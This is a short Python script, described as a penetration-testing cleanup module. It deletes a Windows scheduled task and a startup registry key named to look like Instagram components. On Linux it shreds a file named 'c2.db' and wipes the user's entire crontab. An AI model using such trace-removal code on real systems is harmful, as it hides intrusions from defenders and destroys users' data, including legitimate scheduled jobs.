#!/usr/bin/env python3
"""
Cleanup Module
This module provides cleanup functionality for removing traces of penetration testing
operations, including persistent mechanisms, temporary files, and artifacts.
"""

import os
import subprocess
import logging
import platform

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def cleanup_windows():
    """Cleanup operations for Windows systems"""
    logger.info("Performing Windows cleanup...")
    
    try:
        # Remove scheduled tasks (example task name)
        subprocess.run(['schtasks', '/delete', '/tn', 'InstagramUpdate', '/f'], capture_output=True)
        logger.info("Removed InstagramUpdate scheduled task")
        
        # Remove startup registry entries
        subprocess.run(['reg', 'delete', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'InstagramHelper', '/f'], shell=True, capture_output=True)
        logger.info("Removed InstagramHelper startup entry")
        
    except Exception as e:
        logger.error(f"Windows cleanup failed: {e}")


def cleanup_linux():
    """Cleanup operations for Linux systems"""
    logger.info("Performing Linux cleanup...")
    
    try:
        # Remove temporary files and artifacts
        if os.path.exists('c2.db'):
            subprocess.run(['shred', '-u', 'c2.db'])
            logger.info("Removed c2.db file")
            
        # Remove cron jobs (example)
        subprocess.run(['crontab', '-r'], capture_output=True)
        logger.info("Removed user crontab")
        
    except Exception as e:
        logger.error(f"Linux cleanup failed: {e}")


def main():
    """Main cleanup function"""
    logger.info("Starting cleanup operations...")
    
    current_platform = platform.system().lower()
    
    if current_platform == 'windows':
        cleanup_windows()
    elif current_platform == 'linux':
        cleanup_linux()
    else:
        logger.warning(f"Cleanup not supported on {current_platform}")
    
    logger.info("Cleanup operations completed")


if __name__ == "__main__":
    main()